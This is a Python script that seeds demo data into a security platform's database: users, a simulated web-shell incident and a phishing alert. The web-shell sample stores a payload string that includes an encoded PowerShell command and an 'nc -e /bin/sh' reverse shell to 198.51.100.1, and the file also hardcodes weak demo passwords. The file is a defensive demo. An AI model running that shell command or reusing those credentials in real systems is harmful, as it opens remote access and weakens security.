"""Seed demo data into the Cyber Platform database. Idempotent."""
from __future__ import annotations

import asyncio
import hashlib
import uuid

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.security import hash_password
from app.db.session import async_session_factory
from app.models.alert import Alert, AlertStatus
from app.models.analysis import Analysis, AnalysisStatus
from app.models.analysis_input import AnalysisInput, InputType
from app.models.analysis_result import AnalysisResult, Severity, Verdict
from app.models.audit_log import AuditAction, AuditLog
from app.models.evidence import Evidence, EvidenceType
from app.models.incident import Incident, IncidentStatus
from app.models.incident_alert import IncidentAlert
from app.models.indicator import Indicator, IndicatorType
from app.models.note import Note
from app.models.notification import Notification, NotificationType
from app.models.organization import Organization
from app.models.report import Report, ReportFormat, ReportStatus
from app.models.user import User, UserRole


async def seed() -> None:
    print("Seeding demo data into Cyber Platform database...")
    async with async_session_factory() as session:
        # 1. Organization
        org_stmt = select(Organization).where(Organization.name == "Acme Defense Corp")
        org_res = await session.execute(org_stmt)
        org = org_res.scalar_one_or_none()
        if not org:
            org = Organization(name="Acme Defense Corp")
            session.add(org)
            await session.flush()
            print(f"Created Organization: {org.name} ({org.id})")

        # 2. Users
        users_data = [
            ("admin@cyber.local", "Admin1234!", UserRole.ADMIN),
            ("analyst@cyber.local", "Analyst1234!", UserRole.ANALYST),
            ("viewer@cyber.local", "Viewer1234!", UserRole.VIEWER),
        ]
        users = {}
        for email, password, role in users_data:
            user_stmt = select(User).where(User.email == email, User.organization_id == org.id)
            user_res = await session.execute(user_stmt)
            user = user_res.scalar_one_or_none()
            if not user:
                user = User(
                    organization_id=org.id,
                    email=email,
                    password_hash=hash_password(password),
                    role=role,
                    is_active=True,
                )
                session.add(user)
                await session.flush()
                print(f"Created User: {email} ({role.value})")
            users[email] = user

        admin_user = users["admin@cyber.local"]
        analyst_user = users["analyst@cyber.local"]

        # 3. Seed Analysis 1: Malicious Web Shell
        raw_payload_1 = "eval(base64_decode('...')); cmd.exe /c powershell -enc JABzACAAPQAg... nc -e /bin/sh 198.51.100.1 4444"
        sha256_1 = hashlib.sha256(raw_payload_1.encode()).hexdigest()
        
        ana_stmt = select(Analysis).where(Analysis.organization_id == org.id, Analysis.content_hash == sha256_1)
        if not (await session.execute(ana_stmt)).scalar_one_or_none():
            ana1 = Analysis(
                organization_id=org.id,
                created_by_id=analyst_user.id,
                analyzer_type="mock",
                status=AnalysisStatus.completed,
                content_hash=sha256_1,
                execution_time_ms=145,
            )
            session.add(ana1)
            await session.flush()

            inp1 = AnalysisInput(
                analysis_id=ana1.id,
                input_type=InputType.text,
                sha256=sha256_1,
                raw_metadata={"source": "WAF sensor 01", "ip": "198.51.100.1"},
            )
            session.add(inp1)

            res1 = AnalysisResult(
                analysis_id=ana1.id,
                verdict=Verdict.malicious,
                severity=Severity.critical,
                risk_score=94.5,
                confidence=0.98,
                summary="Critical Web Shell and Reverse Shell execution payload detected.",
                reasons=[
                    "Matched known suspicious attack keywords in payload",
                    "Rule match: Web Shell & Command Injection Signatures",
                    "Threat intel feed 'MockThreatIntel' flagged ip_address '198.51.100.1'",
                ],
                contributing_factors=[
                    {"source": "rules", "raw_score": 45.0, "confidence": 0.95},
                    {"source": "ml_model", "raw_score": 85.0, "confidence": 0.95},
                    {"source": "threat_intel", "raw_score": 95.0, "confidence": 0.90},
                ],
                recommendations=[
                    "Isolate affected endpoints/assets immediately from the network.",
                    "Revoke active user sessions and reset credentials.",
                    "Block related domains/IPs at the perimeter firewall / DNS firewall.",
                    "Initiate standard Incident Response triage workflow.",
                ],
                indicators=[
                    {"type": "ip_address", "value": "198.51.100.1", "confidence": 0.95},
                ],
                model_version="v1.0.0-mock",
                rule_pack_version="1.2.0",
                policy_version="1.0.0",
                execution_time_ms=145,
            )
            session.add(res1)

            # Indicator
            ind1 = Indicator(
                organization_id=org.id,
                analysis_id=ana1.id,
                indicator_type=IndicatorType.ip_address,
                value="198.51.100.1",
                confidence=0.95,
                context={"threat": "C2 Server - Cobalt Strike"},
            )
            session.add(ind1)

            # Alert
            dedup_1 = f"{org.id}:Web Shell Execution Attempt:{ana1.id}"
            alert1 = Alert(
                organization_id=org.id,
                analysis_id=ana1.id,
                assigned_to_id=analyst_user.id,
                title="Critical Alert: Web Shell & Command Injection Detected",
                description="Automated analysis detected reverse shell invocation to 198.51.100.1",
                severity=Severity.critical,
                status=AlertStatus.escalated,
                risk_score=94.5,
                dedup_key=hashlib.sha256(dedup_1.encode()).hexdigest(),
            )
            session.add(alert1)
            await session.flush()

            # Incident
            inc1 = Incident(
                organization_id=org.id,
                owner_id=analyst_user.id,
                title="INC-2026-001: Web Shell & RCE Attempt against Public Ingress",
                description="Investigating reverse shell command injection targeting perimeter server.",
                status=IncidentStatus.investigating,
                severity=Severity.critical,
            )
            session.add(inc1)
            await session.flush()

            # Link alert to incident
            session.add(IncidentAlert(incident_id=inc1.id, alert_id=alert1.id))

            # Note
            session.add(
                Note(
                    incident_id=inc1.id,
                    author_id=analyst_user.id,
                    content="Firewall rule deployed to block 198.51.100.1. Analyzing memory artifacts.",
                )
            )

            # Evidence
            session.add(
                Evidence(
                    analysis_id=ana1.id,
                    incident_id=inc1.id,
                    uploaded_by_id=analyst_user.id,
                    evidence_type=EvidenceType.text,
                    title="Injected Request Payload",
                    content=raw_payload_1,
                )
            )

            # Notification
            session.add(
                Notification(
                    user_id=analyst_user.id,
                    notification_type=NotificationType.alert_created,
                    title="Critical Alert Escalated",
                    message="Alert 'Critical Alert: Web Shell & Command Injection Detected' assigned to you.",
                    entity_type="alert",
                    entity_id=str(alert1.id),
                )
            )

            # Audit log
            session.add(
                AuditLog(
                    organization_id=org.id,
                    user_id=analyst_user.id,
                    action=AuditAction.create,
                    target_type="incident",
                    target_id=str(inc1.id),
                    details={"title": inc1.title, "severity": inc1.severity.value},
                )
            )

        # 4. Seed Analysis 2: Phishing URL
        raw_payload_2 = "Urgent: Please verify your account and password reset at https://secure-login-update-verify.com/login.php"
        sha256_2 = hashlib.sha256(raw_payload_2.encode()).hexdigest()
        
        ana2_stmt = select(Analysis).where(Analysis.organization_id == org.id, Analysis.content_hash == sha256_2)
        if not (await session.execute(ana2_stmt)).scalar_one_or_none():
            ana2 = Analysis(
                organization_id=org.id,
                created_by_id=admin_user.id,
                analyzer_type="mock",
                status=AnalysisStatus.completed,
                content_hash=sha256_2,
                execution_time_ms=88,
            )
            session.add(ana2)
            await session.flush()

            session.add(
                AnalysisInput(
                    analysis_id=ana2.id,
                    input_type=InputType.url,
                    sha256=sha256_2,
                    raw_metadata={"email_subject": "Security Notice: Immediate Action Required"},
                )
            )

            session.add(
                AnalysisResult(
                    analysis_id=ana2.id,
                    verdict=Verdict.malicious,
                    severity=Severity.high,
                    risk_score=82.0,
                    confidence=0.92,
                    summary="High confidence phishing credential harvester detected.",
                    reasons=[
                        "Matched phishing social engineering keywords",
                        "Threat intel feed 'MockThreatIntel' flagged domain 'secure-login-update-verify.com'",
                    ],
                    recommendations=[
                        "Block domain secure-login-update-verify.com across enterprise DNS.",
                        "Search mailboxes for matching sender and purge incoming emails.",
                    ],
                    indicators=[
                        {"type": "domain", "value": "secure-login-update-verify.com", "confidence": 0.95},
                        {"type": "url", "value": "https://secure-login-update-verify.com/login.php", "confidence": 0.98},
                    ],
                    model_version="v1.0.0-mock",
                    rule_pack_version="1.2.0",
                    policy_version="1.0.0",
                    execution_time_ms=88,
                )
            )

            session.add(
                Indicator(
                    organization_id=org.id,
                    analysis_id=ana2.id,
                    indicator_type=IndicatorType.domain,
                    value="secure-login-update-verify.com",
                    confidence=0.95,
                    context={"threat": "Phishing Landing Page"},
                )
            )

            dedup_2 = f"{org.id}:Phishing URL Detected:{ana2.id}"
            session.add(
                Alert(
                    organization_id=org.id,
                    analysis_id=ana2.id,
                    assigned_to_id=analyst_user.id,
                    title="High Alert: Credential Harvesting Phishing Link",
                    description="Phishing email targeting employee login credentials.",
                    severity=Severity.high,
                    status=AlertStatus.open,
                    risk_score=82.0,
                    dedup_key=hashlib.sha256(dedup_2.encode()).hexdigest(),
                )
            )

        await session.commit()
        print("Demo data seeded successfully!")


if __name__ == "__main__":
    asyncio.run(seed())
